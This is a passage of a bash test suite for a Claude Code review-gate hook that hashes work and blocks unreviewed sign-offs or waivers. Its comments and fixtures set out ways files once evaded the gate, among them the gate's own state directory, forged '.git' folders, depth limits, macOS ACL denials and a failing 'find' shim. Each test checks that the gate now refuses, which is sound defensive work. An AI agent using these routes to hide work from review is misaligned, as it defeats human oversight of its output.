# `.claude/worktrees/**/build/` case the bound exists for -- was never pruned.
# 3000 chunks took 6.30s against 0.26s name-based; this must stay fast AND stay
# out of the hash, without pruning anything under a rendered root.
d=$(new_repo) || exit 1
mkdir -p "$d/nested/build/_app"
for i in 1 2 3 4 5; do echo "chunk$i" > "$d/nested/build/_app/c$i.js"; done
printf 'nested/\n' >> "$d/.git/info/exclude"
expect_allow "$d" "a nested artifact tree stays out of the hash"
rm -rf "$d"

# HASHABLE_EXT was an allowlist in a file whose scope rule is a denylist, so
# .scss/.mts/.jsx/.tsx/.vue under a hidden src/ hashed to nothing.
d=$(new_repo) || exit 1
mkdir -p "$d/hidden/src"
printf 'a{color:red}\n' > "$d/hidden/src/a.scss"
printf 'hidden/\n' >> "$d/.git/info/exclude"
h1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
printf 'a{color:blue}\n' > "$d/hidden/src/a.scss"
h2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
if [ -n "$h1" ] && [ "$h1" != "$h2" ]; then
  ok "an unlisted source extension in a hidden directory moves the hash"
else
  no "an unlisted source extension in a hidden directory moves the hash" "hash unchanged ($h1 -> $h2)"
fi
rm -rf "$d"

# Machine noise must not convene a board: .DS_Store changes when Finder opens a
# folder, and Claude Code rewrites settings.local.json on a permission grant --
# so the gate could invalidate its own sign-off through an action it provoked.
d=$(new_repo) || exit 1
printf 'x\n' > "$d/.DS_Store"
mkdir -p "$d/.claude" && printf '{}\n' > "$d/.claude/settings.local.json"
printf '.DS_Store\nsettings.local.json\n' >> "$d/.git/info/exclude"
expect_allow "$d" "machine noise does not convene a board"
rm -rf "$d"


# docs/ and .vscode/ were in WORK_DENY but the bundler resolves relative imports
# into them, so they were a permanent hiding place: one board round on the import
# line, then every component added afterwards was free. import.meta.glob made
# even the first free. This is the shape the symlink guard defended against,
# reachable without any symlink at all.
d=$(new_repo) || exit 1
mkdir -p "$d/docs"
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/docs/Widget.svelte"
expect_block "$d" "a component under docs/ is reviewable work"
rm -rf "$d"

# The state dir must never be inside the hashed set. When an external rule put it
# there, four PASSes printed "cleared" and the gate blocked anyway, each retry
# writing two more signoffs and moving the hash further away -- unrecoverable.
d=$(new_repo) || exit 1
echo "x" > "$d/src/routes/+page.svelte"
printf '.claude/.review-board-state/\n' >> "$d/.git/info/exclude"
out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh <<<"$GATE_STDIN" 2>&1)
if printf '%s' "$out" | grep -q "would make every sign-off invalidate itself"; then
  ok "an externally-ignored state dir is diagnosed, not livelocked"
else
  no "an externally-ignored state dir is diagnosed, not livelocked" "no diagnostic: $(printf '%s' "$out" | head -c 80)"
fi
rm -rf "$d"

# The IN-TREE half of the same hazard, which the guard above deliberately does
# not cover. `WORK_DENY` is passed to `ignored_matching_paths` at all three of
# its call sites and, until `path_is_denied` existed, did nothing whatsoever for
# the state DIRECTORY: git honors `:(exclude)` for an individually-named file
# and reports a collapsed ignored directory whole regardless of the pathspec
# (all three spellings -- bare, trailing slash, `/**`). The bookkeeping the
# sign-off flow actually writes there must never move the hash, or recording a
# sign-off invalidates the sign-off just recorded.
#
# REDUNDANTLY GUARDED, and stated as such rather than counted among the probes a
# single mutation reddens: `path_is_denied` drops the path AND `is_source`
# rejects `.signoff`, so either alone keeps this green. It is a regression guard
# for the historical self-invalidating sign-off, not evidence about this change.
# Falsifiable, which is the part that matters -- pre-fix work-hash.sh with
# `.signoff` added to IS_SOURCE_EXT reddens it -- so it is a real property pin
# rather than an assertion that cannot fail.
#
# Asserts the RELATION, not a digest: hash values are tree-specific and no
# literal would reproduce anywhere else. `h1` is nonempty because the
# `.gitignore` commit lands AFTER new_repo's `--initialize`, so it is itself
# work in flight against the baseline -- deliberately NOT re-initialized here,
# since an empty `h1` would let a double-failure pass as `"" = ""`.
d=$(new_repo) || exit 1
(cd "$d" && printf '.claude/.review-board-state/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
wh() { (cd "$1" && CLAUDE_PROJECT_DIR="$1" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"'); }
we() { (cd "$1" && CLAUDE_PROJECT_DIR="$1" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"'); }
wf() { (cd "$1" && CLAUDE_PROJECT_DIR="$1" bash -c '. .claude/hooks/work-hash.sh; waiver_forbidden_paths; echo "$WORK_ERROR"'); }
h1=$(wh "$d")
printf 'x\n' > "$d/.claude/.review-board-state/round.signoff"
h2=$(wh "$d")
# A REWRITE too, not just the create: the original finding moved the hash on
# both, and a filter that only skipped new paths would pass the create alone.
printf 'y\n' > "$d/.claude/.review-board-state/round.signoff"
h3=$(wh "$d")
# One level down, in the directory the sign-offs themselves live in -- the walk
# enumerates recursively, so a filter applied to the collapsed top-level entry
# only would still let this through.
mkdir -p "$d/.claude/.review-board-state/signoffs"
printf 'z\n' > "$d/.claude/.review-board-state/signoffs/deep.signoff"
h4=$(wh "$d")
if [ -z "$h1" ]; then
  no "the board's own bookkeeping does not move the hash" "h1 was empty; the fixture proves nothing"
elif [ "$h1" = "$h2" ] && [ "$h1" = "$h3" ] && [ "$h1" = "$h4" ]; then
  ok "the board's own bookkeeping does not move the hash"
else
  no "the board's own bookkeeping does not move the hash" "h1=[$h1] h2=[$h2] h3=[$h3] h4=[$h4]"
fi
rm -rf "$d"

# Making WORK_DENY real on the walk closed a livelock and, on its own, opened
# the `docs/` hole in the one DIRECTORY WORK_DENY names: a `.svelte` written
# into the state dir stopped moving the hash and dropped out of
# WAIVER_FORBIDDEN, so `--grounds formatting-only` would be recorded over a
# component vite still bundles and SSRs. Measured, both halves: pre-fix the hash
# MOVED and WAIVER_FORBIDDEN listed the file; with the filter and no guard the
# hash was UNCHANGED and WAIVER_FORBIDDEN was empty. The gate's first design
# rule is fail closed, so this refuses BY NAME rather than either hiding it (a
# silent allow) or hashing it (drift with no explanation, which is the livelock
# CHR-19 killed). Both entry points, because the waiver half is the live half.
for entry in hash waiver; do
  d=$(new_repo) || { no "setup" "could not build a test repo"; break; }
  (cd "$d" && printf '.claude/.review-board-state/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
  printf '<div role="dialog" aria-modal="true"><button>no trap</button></div>\n' \
    > "$d/.claude/.review-board-state/Evil.svelte"
  if [ "$entry" = hash ]; then err=$(we "$d"); else err=$(wf "$d"); fi
  # Names the offending FILE, not just the directory: "something in there" is
  # not actionable, and the message is the entire remedy for a livelock.
  if printf '%s' "$err" | grep -q 'Evil.svelte'; then
    ok "a rendered file in the state dir refuses by name ($entry)"
  else
    no "a rendered file in the state dir refuses by name ($entry)" "got [$err]"
  fi
  rm -rf "$d"
done

# The same refusal one level down, which pins RECURSION rather than anything
# about ignore rules: `state_dir_hides_source` walks the filesystem and its own
# docblock says it is not conditional on the directory being ignored. An earlier
# version of this comment credited the nested `.gitignore` below for reaching
# the refusal, which a review round measured as decorative -- the guard fires
# identically with and without it. That rationale is real, but it belongs to the
# `:(exclude)` probe further down, where it IS load-bearing. Bounding the walk
# to `-maxdepth 1` reddens this probe and the nine artifact shapes below it --
# ten, measured. The figure has been wrong three times here: "this probe alone",
# then "ten" (correct), then "twelve", the last written on the reasoning that
# readability detection had moved onto this walk. It had not: readability is
# carried by the DEPTH-probe walk's exit status, which this mutation does not
# touch, so no readability probe can redden from it. Two reviewers measured ten
# independently and the correction was made by re-running the mutation, not by
# reasoning about it again -- which is the whole point, since every wrong
# version here was produced by reasoning.
d=$(new_repo) || exit 1
mkdir -p "$d/.claude/.review-board-state/signoffs"
printf '<div role="dialog"></div>\n' > "$d/.claude/.review-board-state/signoffs/Evil.svelte"
err=$(we "$d")
if printf '%s' "$err" | grep -q 'Evil.svelte'; then
  ok "a rendered file below the denied path refuses by name"
else
  no "a rendered file below the denied path refuses by name" "got [$err]"
fi
rm -rf "$d"

# The "or sits UNDER one" arm of path_is_denied is a SEPARATE arm from the
# exact-match one and the probes above cannot see it -- the state-dir guard
# refuses before the filter matters, and bookkeeping below the denied path
# would not move the hash even unfiltered (is_source rejects it). Deleting that
# one line left the whole suite green. Pinned at the unit level instead.
#
# What makes `deny/sub/` survive `:(exclude)deny` at all is TRACKED CONTENT
# inside the excluded directory, which forces git to descend past the pathspec
# prune. Two earlier explanations of this fixture were wrong: it is not that git
# only fails on the entry that IS the excluded path (this entry is strictly
# below it and survives), and it is not the .gitignore's nesting. The nested
# `.gitignore` works because committing it PUTS TRACKED CONTENT IN `deny/` --
# any tracked file does the same, and a top-level rule naming the subdirectory
# also survives once one exists. With nothing tracked inside, git prunes the
# directory, the entry never appears, and this probe would pass for the wrong
# reason. Measured all four ways.
#
# Note the live repo reaches only the exact-match arm: its state dir is ignored
# whole and holds no tracked content. This arm is defensive coverage, not a
# mirror of a production configuration.
d=$(new_repo) || exit 1
mkdir -p "$d/deny/sub" "$d/foo/bar"
# Committed, not merely written: being TRACKED is what makes it work, and it
# works as tracked content rather than as an ignore rule (see above).
printf 'sub/\n' > "$d/deny/.gitignore"
(cd "$d" && printf 'foo/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
printf 'x\n' > "$d/foo/bar/x.ts"
printf 'x\n' > "$d/deny/sub/x.ts"
imp() { (cd "$1" && shift && bash -c '. .claude/hooks/work-hash.sh; ignored_matching_paths "$@"' _ "$@"); }
out=$(imp "$d" . ':(exclude)deny')
# `foo/` is a POSITIVE CONTROL, not incidental: it is ignored and not excluded
# here, so it must come back. Without it a broken-and-empty enumeration would
# satisfy "deny/sub/ is absent" vacuously -- the shape this suite already
# documents as the way an absence check stops discriminating.
if printf '%s' "$out" | grep -qxF 'foo/' && ! printf '%s' "$out" | grep -q 'deny'; then
  ok "an entry below an excluded path is suppressed"
else
  no "an entry below an excluded path is suppressed" "got [$out]"
fi
# Torn down before the probes below reuse this fixture: `deny/sub/` stays
# ignored via its nested .gitignore and would otherwise appear in their output
# and fail them for a reason that has nothing to do with what they assert.
rm -rf "$d/deny"
if [ "$(imp "$d" . ':(exclude)foo')" = "" ]; then
  ok "an excluded ignored directory is suppressed"
else
  no "an excluded ignored directory is suppressed" "got [$(imp "$d" . ':(exclude)foo')]"
fi
if [ "$(imp "$d" . ':(exclude)foo/bar')" = "foo/" ]; then
  ok "an ignored directory is kept when the excluded path is below it"
else
  no "an ignored directory is kept when the excluded path is below it" "got [$(imp "$d" . ':(exclude)foo/bar')]"
fi
# `foo` is a string prefix of `foobar` without being a path prefix of it, so a
# bare `${p#$deny}`-style test would drop the wrong directory.
mkdir -p "$d/foobar"
(cd "$d" && printf 'foo/\nfoobar/\n' > .gitignore) >/dev/null 2>&1
printf 'export const y = 2\n' > "$d/foobar/y.ts"
if [ "$(imp "$d" . ':(exclude)foo')" = "foobar/" ]; then
  ok "a string-prefix match that is not a path prefix is not suppressed"
else
  no "a string-prefix match that is not a path prefix is not suppressed" "got [$(imp "$d" . ':(exclude)foo')]"
fi
rm -rf "$d"

# The guard's own bounds and blind spots, each of which was a SILENT ALLOW
# before it carried its own walk. The first version reused `walk_hidden_dir`,
# which answers "what should I hash" -- so it skipped `is_artifact` names,
# pruned `*/.git`, stopped at depth 12, and drew its depth and readability
# refusals from compute_work_hash's bounds loop, the very loop `path_is_denied`
# had just removed the state dir from. A review round put a `role="dialog"`
# with no focus trap in each of these and watched the gate report nothing, then
# watched a real vite build server-render the `dist/` one.
#
# `deep` and `unreadable` are REGRESSIONS this body of work introduced and now
# closes: both drew a named refusal at 0261ac8. The artifact and `.git` shapes
# never worked, at 0261ac8 either -- they are here because the guard's own
# refusal text promises they do.
evil='<div role="dialog" aria-modal="true"><button>x</button></div>'
for shape in dist build coverage node_modules .svelte-kit .cache .output .turbo .git; do
  d=$(new_repo) || { no "setup" "could not build a test repo"; break; }
  (cd "$d" && printf '.claude/.review-board-state/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
  mkdir -p "$d/.claude/.review-board-state/$shape"
  printf '%s\n' "$evil" > "$d/.claude/.review-board-state/$shape/Evil.svelte"
  err=$(we "$d")
  if printf '%s' "$err" | grep -q 'Evil.svelte'; then
    ok "a rendered file under an artifact-named state subdir refuses ($shape)"
  else
    no "a rendered file under an artifact-named state subdir refuses ($shape)" "got [$err]"
  fi
  rm -rf "$d"
done

# Depth. The bound is the guard's own `-maxdepth`, so past it `find` simply does
# not descend -- silently, which is why the refusal has to be derived from a
# second count rather than from an empty walk.
d=$(new_repo) || exit 1
(cd "$d" && printf '.claude/.review-board-state/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/.claude/.review-board-state/a/b/c/d/e/f/g/h/i/j/k/l"
printf '%s\n' "$evil" > "$d/.claude/.review-board-state/a/b/c/d/e/f/g/h/i/j/k/l/Evil.svelte"
err=$(we "$d")
# Names the directory, not the file: past the bound the gate has not seen the
# file and must not pretend to. "nests deeper" is the actionable half.
if printf '%s' "$err" | grep -q 'nests deeper'; then
  ok "a rendered file below the state dir's depth bound refuses"
else
  no "a rendered file below the state dir's depth bound refuses" "got [$err]"
fi
rm -rf "$d"

# Readability. `find`'s stderr is swallowed, so an unreadable directory is
# byte-identical on stdout to an empty one. Mode 111 is the live shape: the
# directory is still traversable by exact path, so a bundler resolving an import
# reads the component fine while an unprobed gate enumerates nothing.
d=$(new_repo) || exit 1
(cd "$d" && printf '.claude/.review-board-state/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/.claude/.review-board-state/hidden"
printf '%s\n' "$evil" > "$d/.claude/.review-board-state/hidden/Evil.svelte"
chmod 111 "$d/.claude/.review-board-state/hidden"
err=$(we "$d")
chmod 755 "$d/.claude/.review-board-state/hidden"
if printf '%s' "$err" | grep -q 'cannot be read'; then
  ok "an unreadable state subdir refuses rather than reading as empty"
else
  no "an unreadable state subdir refuses rather than reading as empty" "got [$err]"
fi
rm -rf "$d"

# ACL, not mode bits. On macOS `chmod +a "<user> deny list" <dir>` denies
# readdir while the mode still reads `drwxr-xr-x` -- no root needed -- so every
# `-perm` probe reads clean, `ls` on the state-dir ROOT succeeds because the ACL
# is on a child, and `find` enumerates nothing. Measured before this was fixed:
# a `role="dialog"` with no focus trap sat there through four `--pass` sign-offs
# while staying readable by exact path, so a bundler resolving the import got a
# component the gate could not see. `ls -- <dir>` would in fact have caught THIS
# ACL: an earlier version of this comment said it exits 0 with empty output,
# which was measured in a shell where `ls` is an alias for `eza` -- `/bin/ls`,
# which is what a hook gets, exits 1. Neither `ls` nor access(2) survived
# contact with the next ACL verb, and both were removed once asking `find`
# whether it FINISHED turned out to subsume every permission shape at once --
# see the `readattr` probes below. This probe pins ONE instance of the ACL
# class and is named for that instance; the mechanism it exercises today is the
# exit-status check, not a permission test.
#
# Skips honestly where `chmod +a` does not exist rather than passing silently:
# this is a macOS-specific mechanism, and a probe that quietly no-ops elsewhere
# reads as coverage it does not have.
d=$(new_repo) || exit 1
(cd "$d" && printf '.claude/.review-board-state/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/.claude/.review-board-state/acl"
printf '%s\n' "$evil" > "$d/.claude/.review-board-state/acl/Evil.svelte"
if chmod +a "$(id -un) deny list" "$d/.claude/.review-board-state/acl" 2>/dev/null; then
  err=$(we "$d")
  # Strip the ACL BEFORE rm -rf, or the teardown wedges on the same denial.
  chmod -N "$d/.claude/.review-board-state/acl" 2>/dev/null
  if printf '%s' "$err" | grep -q 'cannot be read'; then
    ok "a list-denied ACL on a state subdir refuses rather than reading as empty"
  else
    no "a list-denied ACL on a state subdir refuses rather than reading as empty" "got [$err]"
  fi
else
  ok "a list-denied ACL on a state subdir refuses rather than reading as empty (skipped: no chmod +a here)"
fi
rm -rf "$d"

# Vite compiles more than `.css`. Its own matcher in the installed 8.1.5 is
# `(css|less|sass|scss|styl|stylus|pcss|postcss|sss)`, and IS_SOURCE_EXT carried
# five of those nine. Build-proven rather than read off the regex: a scratch
# project using this repo's own vite compiled a state-dir `.pcss` into shipped
# CSS carrying `outline: none` on `:focus-visible`, and
# `--grounds formatting-only` recorded cleanly over it.
for ext in pcss postcss sss stylus scss less sass styl; do
  d=$(new_repo) || { no "setup" "could not build a test repo"; break; }
  (cd "$d" && printf '.claude/.review-board-state/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
  printf ':root{--x:1}.focus-invisible:focus-visible{outline:none}\n' \
    > "$d/.claude/.review-board-state/theme.$ext"
  err=$(we "$d")
  if printf '%s' "$err" | grep -q "theme.$ext"; then
    ok "a stylesheet vite compiles refuses in the state dir (.$ext)"
  else
    no "a stylesheet vite compiles refuses in the state dir (.$ext)" "got [$err]"
  fi
  rm -rf "$d"
done

# The same extensions must also be unwaivable tree-wide: WAIVER_NEVER carried
# only `.css`, so `assets/theme.pcss` outside `src/` waived cleanly anywhere.
for ext in pcss postcss sss stylus scss less sass styl; do
  d=$(new_repo) || { no "setup" "could not build a test repo"; break; }
  mkdir -p "$d/assets"
  printf '.focus-invisible:focus-visible{outline:none}\n' > "$d/assets/theme.$ext"
  if signoff "$d" --waive --grounds formatting-only --reason r >/dev/null 2>&1; then
    no "a stylesheet vite compiles is not waivable outside src/ (.$ext)" "waiver was accepted"
  else
    ok "a stylesheet vite compiles is not waivable outside src/ (.$ext)"
  fi
  rm -rf "$d"
done

# SVG carries `role`, `aria-label` and `<title>`, so it renders in the sense
# WAIVER_NEVER means -- but it was in IS_SOURCE_EXT only, so `assets/icon.svg`
# outside `src/` waived cleanly under `formatting-only`.
d=$(new_repo) || exit 1
mkdir -p "$d/assets"
printf '<svg role="img" aria-label="unreviewed"><title>x</title></svg>\n' > "$d/assets/icon.svg"
if signoff "$d" --waive --grounds formatting-only --reason r >/dev/null 2>&1; then
  no "an svg outside src/ is not waivable" "waiver was accepted"
else
  ok "an svg outside src/ is not waivable"
fi
rm -rf "$d"

# Case. `renders()` has always lowercased; `is_source` does not, and the two
# disagreeing let `Evil.SVELTE` escape this guard while `renders()` would forbid
# waiving the identical file anywhere else in the tree.
d=$(new_repo) || exit 1
(cd "$d" && printf '.claude/.review-board-state/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
printf '%s\n' "$evil" > "$d/.claude/.review-board-state/Evil.SVELTE"
err=$(we "$d")
if printf '%s' "$err" | grep -q 'Evil.SVELTE'; then
  ok "an uppercase extension in the state dir does not escape the guard"
else
  no "an uppercase extension in the state dir does not escape the guard" "got [$err]"
fi
rm -rf "$d"

# An ACL denying `readattr` defeats every probe that asks about permission,
# because `find` cannot classify the entry at all: `-type d` never names the
# directory, so a per-directory test never runs on it, and `-type f` never
# descends. Mode bits read `drwxr-xr-x`, access(2) answers true for both, and the
# depth counters come back equal. Build-proven as a live fail-open before this
# was closed -- vite compiled a component behind such an ACL and shipped
# `aria-modal="true"` with no focus trap into the bundle, while the hash stayed
# put and WAIVER_FORBIDDEN stayed empty. The only probe that catches it is
# asking `find` whether it finished.
#
# Driven at BOTH scopes because they are different walks: the state dir goes
# through `state_dir_hides_source`, and a plain ignored directory goes through
# `walk_hidden_dir`, where this was a pre-existing hole rather than one this
# body of work introduced.
for scope in state-dir tree-wide; do
  d=$(new_repo) || { no "setup" "could not build a test repo"; break; }
  if [ "$scope" = state-dir ]; then
    (cd "$d" && printf '.claude/.review-board-state/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
    target="$d/.claude/.review-board-state/parts"
  else
    (cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
    target="$d/tmp/parts"
  fi
  mkdir -p "$target"
  printf '%s\n' "$evil" > "$target/Evil.svelte"
  if chmod +a "$(id -un) deny readattr" "$target" 2>/dev/null; then
    err=$(we "$d")
    # Before rm -rf, or the teardown wedges on the same denial.
    chmod -N "$target" 2>/dev/null
    # Any refusal naming the directory is correct here; the file cannot be named
    # because the gate never saw it, which is the honest thing to report.
    if [ -n "$err" ]; then
      ok "a readattr-denied directory refuses rather than reading as empty ($scope)"
    else
      no "a readattr-denied directory refuses rather than reading as empty ($scope)" "no refusal; got []"
    fi
  else
    ok "a readattr-denied directory refuses rather than reading as empty ($scope, skipped: no chmod +a here)"
  fi
  rm -rf "$d"
done

# The same denial on the state directory ITSELF is a different arm again:
# `[ -d "$STATE_DIR" ]` is a stat, so a readattr denial there turned "this
# directory holds a component" into "there is no state directory" and returned
# quietly. Answered now by asking the PARENT for its entries, since readdir
# supplies names without stat'ing them.
d=$(new_repo) || exit 1
(cd "$d" && printf '.claude/.review-board-state/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
printf '%s\n' "$evil" > "$d/.claude/.review-board-state/Evil.svelte"
if chmod +a "$(id -un) deny readattr" "$d/.claude/.review-board-state" 2>/dev/null; then
  err=$(we "$d")
  chmod -N "$d/.claude/.review-board-state" 2>/dev/null
  if printf '%s' "$err" | grep -q 'cannot be read'; then
    ok "a readattr-denied state dir ROOT refuses rather than reading as absent"
  else
    no "a readattr-denied state dir ROOT refuses rather than reading as absent" "got [$err]"
  fi
else
  ok "a readattr-denied state dir ROOT refuses rather than reading as absent (skipped: no chmod +a here)"
fi
rm -rf "$d"

# The negative control for that arm, and the more important half: a genuinely
# absent state directory must still return quietly. Getting this wrong makes
# every fresh checkout refuse, which is the livelock CHR-19 exists to remove.
d=$(new_repo) || exit 1
rm -rf "$d/.claude/.review-board-state"
res=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; state_dir_hides_source')
if [ -z "$res" ]; then
  ok "a genuinely absent state dir does not provoke a refusal"
else
  no "a genuinely absent state dir does not provoke a refusal" "got [$res]"
fi
# The refusal must also still fire for a state dir that exists but holds source,
# from the SAME fixture shape -- otherwise the negative control above is
# satisfiable by a guard that never refuses at all.
printf '%s\n' "$evil" > "$d/Evil.svelte" 2>/dev/null
mkdir -p "$d/.claude/.review-board-state"
printf '%s\n' "$evil" > "$d/.claude/.review-board-state/Evil.svelte"
res=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; state_dir_hides_source')
case "$res" in
  source:*Evil.svelte) ok "the same fixture still refuses once the state dir exists" ;;
  *) no "the same fixture still refuses once the state dir exists" "got [$res]" ;;
esac
rm -rf "$d"

# The `-maxdepth` BOUNDARY, which every permission probe in this file used to
# miss because they all plant their fixture at depth 1. `find` never OPENS a
# directory sitting at exactly `-maxdepth`, so a denial that blocks only descent
# lets the `-type f` walk exit 0 with the contents silently absent. Measured at
# depths 1, 11 and 12: `chmod 000`, `111`, `666` and an ACL denying `list` all
# exit 1 at 1 and 11 and 0 at exactly 12, on BSD find and bfs alike. Only the
# deeper depth-probe walk opens it, which is why its exit status is now read.
#
# The two scopes need DIFFERENT shapes, which is the trap here. In the state dir
# `chmod 111` discriminates, because that guard has no permission probe left at
# all. Tree-wide it does NOT: `compute_work_hash`'s bounds loop still carries
# `-perm` arms with no `-maxdepth`, so they stat the boundary directory from its
# parent and catch a mode denial there for their own reasons. Measured -- the
# first version of this probe used `chmod 111` for both and stayed green with
# the tree-wide check deleted. An ACL denying `list` leaves mode bits clean, so
# only the deeper depth-probe walk sees it.
for scope in state-dir tree-wide; do
  d=$(new_repo) || { no "setup" "could not build a test repo"; break; }
  if [ "$scope" = state-dir ]; then
    (cd "$d" && printf '.claude/.review-board-state/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
    root="$d/.claude/.review-board-state"
  else
    (cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
    root="$d/tmp"
  fi
  # EXACTLY twelve levels below the walk root, which is the boundary: the root
  # is depth 0, so `l` is depth 12 and `find -maxdepth 12` never opens it. An
  # earlier version used eleven, where the ordinary walk still opens the
  # directory and its own exit status catches the denial -- so the probe passed
  # with the boundary check deleted, for a reason that had nothing to do with
  # the boundary.
  deep="$root/a/b/c/d/e/f/g/h/i/j/k/l"
  mkdir -p "$deep"
  printf '%s\n' "$evil" > "$deep/Evil.svelte"
  if [ "$scope" = state-dir ]; then
    chmod 111 "$deep"; err=$(we "$d"); chmod 755 "$deep"
    if [ -n "$err" ]; then
      ok "a denial at exactly the depth bound refuses ($scope)"
    else
      no "a denial at exactly the depth bound refuses ($scope)" "no refusal; got []"
    fi
  elif chmod +a "$(id -un) deny list" "$deep" 2>/dev/null; then
    err=$(we "$d"); chmod -N "$deep" 2>/dev/null
    if [ -n "$err" ]; then
      ok "a denial at exactly the depth bound refuses ($scope)"
    else
      no "a denial at exactly the depth bound refuses ($scope)" "no refusal; got []"
    fi
  else
    ok "a denial at exactly the depth bound refuses ($scope, skipped: no chmod +a here)"
  fi
  rm -rf "$d"
done

# A transient failure must not let the walk report the FAILED attempt's output.
# Re-probing readability is not re-enumerating: an earlier version ran a second
# `find` with its output discarded, so when that probe succeeded the caller kept
# walk one's partial listing and was told nothing was wrong. A reviewer drove
# that to a recorded `formatting-only` waiver over a live component, and to two
# different file bodies hashing identically. This plants real source, fails the
# first walk of that directory, and asserts the component is STILL seen.
for scope in state-dir tree-wide; do
  d=$(new_repo) || { no "setup" "could not build a test repo"; break; }
  if [ "$scope" = state-dir ]; then
    (cd "$d" && printf '.claude/.review-board-state/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
    printf '%s\n' "$evil" > "$d/.claude/.review-board-state/Evil.svelte"
    match='Evil.svelte'
  else
    (cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
    mkdir -p "$d/tmp/parts"
    printf '%s\n' "$evil" > "$d/tmp/parts/Evil.svelte"
    match='tmp'
  fi
  shimdir=$(mktemp -d) || exit 1
  realfind=$(command -v find)
  cat > "$shimdir/find" <<SHIM
#!/bin/sh
p0=no
for a in "\$@"; do [ "\$a" = "-print0" ] && p0=yes; done
if [ "\$p0" = yes ] && [ ! -f "$shimdir/fired" ]; then
  : > "$shimdir/fired"; exit 1
fi
exec $realfind "\$@"
SHIM
  chmod +x "$shimdir/find"
  err=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" PATH="$shimdir:$PATH" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
  hash=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" PATH="$shimdir:$PATH" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
  # Either outcome is correct: refuse by name, or hash it. Silence is not.
  if printf '%s' "$err" | grep -q "$match" || [ -n "$hash" ]; then
    ok "a transient failure does not report a partial read as nothing ($scope)"
  else
    no "a transient failure does not report a partial read as nothing ($scope)" "silent: err=[$err] hash=[$hash]"
  fi
  rm -rf "$shimdir" "$d"
done

# A FORGED `.git` shape must not hide a component. The prune tests for `HEAD`
# plus `objects/` rather than trusting the name, and both are trivially
# creatable -- so the shape is forgeable, and a name-only `.git` (which the
# prune correctly walks) is the control that proves the probe is testing the
# forged case rather than the easy one. `is_artifact` would KEEP these paths, so
# the prune and the classifier disagree, and a disagreement that drops content
# is a fail-open however the decision was reached.
for shape in forged real name-only; do
  d=$(new_repo) || { no "setup" "could not build a test repo"; break; }
  (cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
  mkdir -p "$d/tmp/parts/.git"
  case "$shape" in
    forged) mkdir -p "$d/tmp/parts/.git/objects"; printf 'ref: refs/heads/main\n' > "$d/tmp/parts/.git/HEAD" ;;
    real)   git init -q --bare "$d/tmp/parts/.git" >/dev/null 2>&1 ;;
    name-only) : ;;
  esac
  printf '%s\n' "$evil" > "$d/tmp/parts/.git/Modal.svelte"
  err=$(we "$d"); errw=$(wf "$d")
  if printf '%s' "$err" | grep -q 'Modal.svelte'; then
    ok "a component behind a .git prune refuses by name ($shape)"
  else
    no "a component behind a .git prune refuses by name ($shape)" "got [$err]"
  fi
  # The waiver half separately, because it is the live half.
  if [ "$shape" = forged ]; then
    if signoff "$d" --waive --grounds formatting-only --reason r >/dev/null 2>&1; then
      no "a component behind a forged .git is not waivable" "waiver was accepted"
    else
      ok "a component behind a forged .git is not waivable"
    fi
  fi
  rm -rf "$d"
done

# `renders()` is fed paths straight out of `walk_hidden_dir`, which prefixes
# every one with `./`. Its `src/`/`static/` PREFIX arms therefore matched
# nothing that came from a walk, so two brand-new SvelteKit load functions under
# an ignored `src/routes/tmp/` -- one turning SSR off -- recorded a
# `formatting-only` waiver with no reviewer. `.svelte` survived on its suffix
# arm; `.ts`, `.js`, `.json` and every `static/` asset did not, which is why
# this probe uses a load function rather than a component.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/src/routes/tmp"
printf 'export const ssr = false;\nexport function load() { return {}; }\n' \
  > "$d/src/routes/tmp/+page.server.ts"
if signoff "$d" --waive --grounds formatting-only --reason r >/dev/null 2>&1; then
  no "a load function in an ignored src/ directory is not waivable" "waiver was accepted"
else
  ok "a load function in an ignored src/ directory is not waivable"
fi
rm -rf "$d"

# The retry probe that separates CHURN from an unreadable tree. `find`'s exit
# status answers "did I finish", which is a strictly larger set than "could I
# read": a directory removed while it was descending also makes it non-zero, and
# this repo's own `.gitignore` lists `test-results/`, which Playwright creates
# and destroys throughout a run. Refusing on the bare status made the gate DENY
